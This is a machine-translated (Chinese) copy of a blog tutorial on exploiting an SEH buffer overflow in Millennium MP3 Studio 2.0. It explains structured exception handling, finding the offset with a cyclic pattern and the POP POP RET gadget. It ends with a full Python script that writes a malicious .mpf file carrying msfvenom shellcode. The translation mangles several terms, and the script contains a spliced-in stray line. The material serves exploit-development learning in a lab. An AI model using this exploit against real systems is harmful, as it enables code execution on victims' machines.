<html>
<head>
<title>Exploiting Millennium MP3 Studio 2.0 with Shellcode Payload</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用外壳代码有效负载开发Millennium MP3 Studio 2.0</h1>
<blockquote>原文：<a href="https://medium.datadriveninvestor.com/exploiting-millennium-mp3-studio-2-0-with-shellcode-payload-82f815bc809b?source=collection_archive---------7-----------------------#2020-06-06">https://medium.datadriveninvestor.com/exploiting-millennium-mp3-studio-2-0-with-shellcode-payload-82f815bc809b?source=collection_archive---------7-----------------------#2020-06-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/e922ff715abff9f64c4027ea73e2efeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:676/format:webp/0*YepOxxSYrd7cfvbv.jpg"/></div></figure><p id="2a07" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">(<strong class="jw ir">此博文非原创</strong>。它涵盖了我的经验和我在复制这种利用时遇到的挑战:Fu11Shade的“Windows利用途径”序列中的【https://fullpwnops.com/local-seh-overflow/】T2。除非另有说明，引用文字均来自Fu11Shade的博文。要配置您的系统来完成本教程:【https://fullpwnops.com/immunity-windbg-mona/】T4</p><p id="6af4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在本教程中，我们将利用当Millennium MP3 Studio 2.0(安装在此:<a class="ae ks" href="https://www.exploit-db.com/exploits/10240" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/10240</a>)试图打开带有某些扩展名的文件时发生的溢出。我在Windows 7 64位虚拟机上完成了本教程。</p><div class="kt ku gp gr kv kw"><a href="https://www.datadriveninvestor.com/2020/02/10/why-encryption-is-critical-to-everyday-life/" rel="noopener  ugc nofollow" target="_blank"><div class="kx ab fo"><div class="ky ab kz cl cj la"><h2 class="bd ir gy z fp lb fr fs lc fu fw ip bi translated">为什么加密对日常生活至关重要？数据驱动的投资者</h2><div class="ld l"><h3 class="bd b gy z fp lb fr fs lc fu fw dk translated">你几乎每天都要输入密码，这是你生活中最基本的加密方式。然而问题是…</h3></div><div class="le l"><p class="bd b dl z fp lb fr fs lc fu fw dk translated">www.datadriveninvestor.com</p></div></div><div class="lf l"><div class="lg l lh li lj lf lk js kw"/></div></div></a></div><p id="66d3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">基于结构化异常处理程序(SEH)的溢出以许多不同的方式工作。在本教程中，我们将使用一个文本文件注入恶意有效载荷到易受攻击的领域。</p><p id="e05c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">什么是“结构化异常处理程序？”相当粗略地说，SEH是一段设计用来处理运行时可能发生的某些错误的代码。异常处理程序可以处理硬件和软件故障。一些常见的处理程序处理诸如无法释放内存块、内存不足、试图访问受限内存位置等问题。</p><p id="b7ba" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果出现异常，并且没有一个处理程序能够解决问题，程序可能会终止或者产生某种意外的输出。</p><p id="5cbe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">有两种SEH机制:</p><ol class=""><li id="3abe" class="ll lm iq jw b jx jy kb kc kf ln kj lo kn lp kr lq lr ls lt bi translated">异常处理程序:可以响应或消除异常的块</li><li id="d9e4" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">终止处理程序:无论异常是否导致终止，总是被调用的块</li></ol><p id="3ba6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当处理程序识别出异常时，处理程序可以:</p><ol class=""><li id="5312" class="ll lm iq jw b jx jy kb kc kf ln kj lo kn lp kr lq lr ls lt bi translated">无法识别异常并将控制传递给其他处理程序</li><li id="07f7" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">认识到这个例外，但是忽略它</li><li id="2712" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">识别异常并处理它</li></ol><p id="2ade" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们来看看这个SEH漏洞是如何工作的——大部分内容都需要解释:</p><ol class=""><li id="80d8" class="ll lm iq jw b jx jy kb kc kf ln kj lo kn lp kr lq lr ls lt bi translated">我们将Millennium进程与免疫联系起来，这样我们就可以精确地观察缓冲区溢出和漏洞的影响。</li><li id="09b7" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">当我们的恶意文件被打开时，应用程序将试图解析数据。</li><li id="a236" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">Fu11Shade告诉我们，当该应用程序的解析程序对带有“.”的文件进行操作时，会出现缓冲区溢出。强积金”扩展。</li><li id="d9e1" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">因此，我们需要创建一个溢出该缓冲区的. mpf文件。</li><li id="1994" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">当出现异常时，控制将跳转到第一个SEH处理程序。</li><li id="604e" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">缓冲区溢出会将SEH处理程序的地址设置为弹出弹出返回序列的地址。</li><li id="68db" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">这将使ESP在堆栈中下移两次，并将其返回给EIP。</li><li id="e4b2" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">大概，我们已经覆盖了这个地址，EIP现在指向一个JMP指令，它把执行移到外壳代码的开始。</li></ol><p id="9668" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们开始吧:</p><p id="da63" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">首先，我们希望将Immunity调试器附加到正在运行的Millennium MP3 Studio进程:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi lz"><img src="../Images/ea9b36e9c11f5970f53ee8f7b52aa249.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9ZWcoawO5O3ImjpOVrXusw.png"/></div></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/4e0a7f653d3d338f04806b4a45433931.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*DD_ofnHp0XkXp4UMA10kaw.png"/></div><figcaption class="mj mk gj gh gi ml mm bd b be z dk">View of the logs in Immunity</figcaption></figure><p id="5e23" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我们希望生成。我们利用的mpf文件。我们可以使用python脚本来实现这一点:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/ad04affa260ccff140082e70f23fc67e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*k_0f3FptSFRhTOZp_kFHtg.png"/></div><figcaption class="mj mk gj gh gi ml mm bd b be z dk">This is copied directly from <a class="ae ks" href="https://fullpwnops.com/local-seh-overflow/" rel="noopener ugc nofollow" target="_blank">https://fullpwnops.com/local-seh-overflow/</a></figcaption></figure><p id="c132" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这个脚本中，我们生成一个有效负载，打开一个名为“evil.mpf”的文件，并将有效负载写入open() (payload_execution)返回的文件对象。</p><p id="178e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">运行脚本后，我们可以看到恶意文件。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mo"><img src="../Images/12273e77f3f8d5e4e18388669e6b267f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oEuMm7aNXpBo2BawjNF7cw.png"/></div></div></figure><p id="00c4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，让我们尝试从Millenium Studio MP3打开evil.mpf，此时它已附加到Immunity:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mp"><img src="../Images/9362a2e21e34fbf6e313988ef2b329e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mkofEtO-wIj5RMqfQQ8G4w.png"/></div></div></figure><p id="fa84" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到EAX和ECX寄存器被A覆盖。此外，我们可以在SEH链中看到一个“损坏条目”:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mq"><img src="../Images/9d252506822a01038dd8bed4ce54ba9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:702/format:webp/1*lF-cRMHV5vngPbfXyFCO9Q.png"/></div></div></figure><p id="13d6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，我们还可以看到Immunity日志中的溢出。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/8174ab3d5a26d8b4a93bde05a4388373.png" data-original-src="https://miro.medium.com/v2/resize:fit:1154/format:webp/1*9AIUDkL_duY-b8P5fPtJxQ.png"/></div></figure><p id="8c87" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">既然我们已经确认存在缓冲区溢出漏洞，我们需要计算缓冲区大小，以便生成旨在覆盖SEH处理程序的精确外壳代码。</p><p id="c970" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以使用Metasploit的模式创建工具来生成一个循环模式，它将帮助您确定数据从哪里开始被覆盖:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi ms"><img src="../Images/6002e6b874a819306c538f200f7375b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yH2P11dH2vlDcSQbd3OXXg.png"/></div></div></figure><p id="0134" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">注意:</strong>我在Windows虚拟机上安装Metasploit框架时遇到了问题(Metasploit社区不再提供),我选择了使用Kali Linux内置的Metasploit框架。</p><p id="61e0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，我们应该将千年进程附加到豁免权上，并打开我们新的恶意文件:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mt"><img src="../Images/4916c20c8e2df93153ea909e162334e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IMd_pGdg79u8_An6ihgr3A.png"/></div></div></figure><p id="474a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到寄存器被我们的模式覆盖。</p><p id="7031" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，让我们运行“findmsp”命令。Findmsp将“在内存中查找循环模式的所有实例或某些引用”(corelan.be)。如果您注入一个循环模式并使您的应用程序崩溃，您可以运行findmsp来获得以下信息(corelan.be):</p><p id="6869" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi">“””</p><ol class=""><li id="f5c4" class="ll lm iq jw b jx jy kb kc kf ln kj lo kn lp kr lq lr ls lt bi translated">可以找到循环模式的位置以及该模式有多长。</li><li id="33e4" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">用4字节循环模式覆盖的寄存器以及覆盖寄存器所需的偏移量。</li><li id="bec5" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">将该点注册到循环模式、偏移量和模式的剩余大小中。</li><li id="8b0e" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">用4字节的循环、偏移和大小覆盖SEH记录。</li><li id="7a8e" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">指针，转换成循环模式(偏移量+大小)。</li><li id="5615" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">堆栈上循环模式的部分、从模式开始的偏移量以及模式的大小。</li></ol><p id="7cbd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi">“””</p><p id="7784" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到SEH处理程序被覆盖:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mu"><img src="../Images/99dcdfd0c0e52aa07804ecce1ccf34d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4YrGHofQ9tpIKzvaD3cXDw.png"/></div></div></figure><p id="ff20" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">为了利用这个“我们需要获得一个流行流行RET小工具。”我们可以通过运行“！豁免赛中的蒙娜丽莎。该命令将在程序中搜索所需的序列，该序列将“将执行流返回到结构化异常处理程序”</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mv"><img src="../Images/583fce6515c7a2c55b9c8d0fbf13542b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i3ZTDL_NvGmXrTuyW_TA5w.png"/></div></div></figure><p id="e808" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">起初，我不知道T2到底是什么，也不知道我们为什么需要它——所以让我们探索一下。</p><p id="9667" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">根据dkalemis.wordpress.com的说法，漏洞作者经常搜索这个序列，“因为这是他们漏洞的一个重要部分。”显然，“流行流行RET是为了创造SEH漏洞所需的指令序列。”值得注意的是，弹出值所在的寄存器对于攻击是否成功并不重要。最重要的是ESP在地址空间上移两次(8个字节，在32位架构中每个位置是4个字节)，并且执行RET指令。因此，要么“流行EAX，流行EBX，RET，或流行ECX，流行ECX，RET，或流行EDX，流行EAX，RET，(等等)都可以。”</p><p id="d48d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">每次RET发生时，“ESP指向的地址的内容被放入EIP并执行”(dkalemis)。因此，攻击者知道ESP + 8的地址将被放入EIP并执行。</p><p id="9cea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">但是为什么ESP在栈中下移两次很重要呢？为什么我们不能用外壳代码覆盖SEH处理程序指令，因为不管怎样，当异常出现时，控制权都会转移到那里？</p><p id="0e72" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因为有安全措施来防止这种情况。</p><p id="d1c5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">根据Dkalemis的说法，SEH是“一个记录的链表，每个记录对应一个异常处理程序。”记录的第一个字段是指向下一个记录的指针，第二个字段是异常处理程序本身的地址。</p><p id="cbee" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">SEH漏洞是基于这样一个事实，即攻击者可以“改变堆栈的一部分，并将值放在那里，从而在出现异常后误导SEH处理程序的执行”(dkalemis)。</p><p id="720a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以，让我们从头开始看看一个流行的流行的RET小工具是如何工作的:</p><ol class=""><li id="1a4b" class="ll lm iq jw b jx jy kb kc kf ln kj lo kn lp kr lq lr ls lt bi translated">引发缓冲区溢出后，执行跳转到第一个SEH处理程序指向的地址。</li><li id="3d55" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">缓冲区溢出将SEH处理程序的地址设置为POP POP RET序列的地址。</li><li id="4a3b" class="ll lm iq jw b jx lu kb lv kf lw kj lx kn ly kr lq lr ls lt bi translated">因此，现在EIP将被设置为ESP + 8字节的值，这将是外壳代码开头的jmp指令。</li></ol><p id="6184" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在回到教程。</p><p id="c97e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们最终的python脚本，包括POP POP RET小工具，将如下所示:</p><pre class="ma mb mc md gt mx my mz na aw nb bi"><span id="c07d" class="nc nd iq my b gy ne nf l ng nh">from struct import *<br/><br/>malicious_file = "evil.mpf"<br/><br/># Log data, item 36<br/># Address=0BADF00D<br/># Message=    SEH record (nseh field) at 0x0018f948 overwritten with normal pattern : 0x31684630 (offset 4112), followed by 1712 bytes of cyclic data after the handler<br/><br/>seh = pack ('&lt;I',  0x10014E98) # POP POP RET from xaudio.dll - using !mona seh -n<br/>nseh = pack ('&lt;I', 0x909032EB) # Short jump over the POPPOPRET filled NSEH<br/><br/># shellcode payload that is generated from msfvenom<br/>shellcode = (<br/>"\xdb\xc8\xba\x50\xf4\xd9\x51\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"<br/>"\x31\x31\x56\x18\x83\xee\xfc\x03\x56\x44\x16\x2c\xad\x8c\x54"<br/>"\xcf\x4e\x4c\x39\x59\xab\x7d\x79\x3d\xbf\x2d\x49\x35\xed\xc1"<br/>"\x22\x1b\x06\x52\x46\xb4\x29\xd3\xed\xe2\x04\xe4\x5e\xd6\x07"<br/>"\x66\x9d\x0b\xe8\x57\x6e\x5e\xe9\x90\x93\x93\xbb\x49\xdf\x06"<br/>"\x2c\xfe\x95\x9a\xc7\x4c\x3b\x9b\x34\x04\x3a\x8a\xea\x1f\x65"<br/>"\x0c\x0c\xcc\x1d\x05\x16\x11\x1b\xdf\xad\xe1\xd7\xde\x67\x38"<br/>"\x17\x4c\x46\xf5\xea\x8c\x8e\x31\x15\xfb\xe6\x42\xa8\xfc\x3c"<br/>"\x39\x76\x88\xa6\x99\xfd\x2a\x03\x18\xd1\xad\xc0\x16\x9e\xba"<br/>"\x8f\x3a\x21\x6e\xa4\x46\xaa\x91\x6b\xcf\xe8\xb5\xaf\x94\xab"<br/>"\xd4\xf6\x70\x1d\xe8\xe9\xdb\xc2\x4c\x61\xf1\x17\xfd\x28\x9f"<br/>"\xe6\x73\x57\xed\xe9\x8b\x58\x41\x82\xba\xd3\x0e\xd5\x42\x36"<br/>"\x6b\x29\x09\x1b\xdd\xa2\xd4\xc9\x5c\xaf\xe6\x27\xa2\xd6\x64"<br/>"\xc2\x5a\x2d\x74\xa7\x5f\x69\x32\x5b\x2d\xe2\xd7\x5b\x82\x03"<br/>"\xf2\x3f\x45\x90\x9e\x91\xe0\x10\x04\xee")<br/><br/>payload = "A" * 4112 # after calculating the buffer size that triggers this specific vulnerability<br/>payload += nseh<br/>payload += seh<br/>payload += "\x90" * 100<br/>payload += shellcode<br/><br/># Log data, item 24<br/># Address=10014E98<br/># Message=  0x10014e98 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [xaudio.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.0.7.0 (c:\mp3-millennium\xaudio.dllpayload_execution = open(malicious_file, 'w+')<br/><br/>try:<br/>    print("[x] Opening the malicious file")<br/>    payload_execution = open(malicious_file, "w+")<br/>    print("[x] Creating a file named", malicious_file) <br/>    payload_execution.write(payload)<br/>    print("[x] Adding payload to the malicious file")<br/>    payload_execution.close()<br/>    print("[x] Sending junk")<br/>    print("[x] Sending POP POP RET via controlled SEH handler")<br/>    print("[x] Jumping to shellcode")<br/>except:<br/>    print("[!] Error creating the exploit")</span></pre><p id="98fa" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">请注意，我们的有效载荷现在还包含一个NOP sled。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/b04605cccf2422c33832840bd02ad7ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:624/format:webp/1*SAYFhRhl1YGtbHVS9A5yjw.png"/></div></figure><p id="adf8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，当我们运行应用程序的最终版本时，我们可以弹出一个计算器。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi nj"><img src="../Images/7d147936177bdf7e53f0506c887f7b68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eAwKY8L_VGhew0F9NFS35w.png"/></div></div></figure><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="nk nl l"/></div></figure></div></div>    
</body>
</html>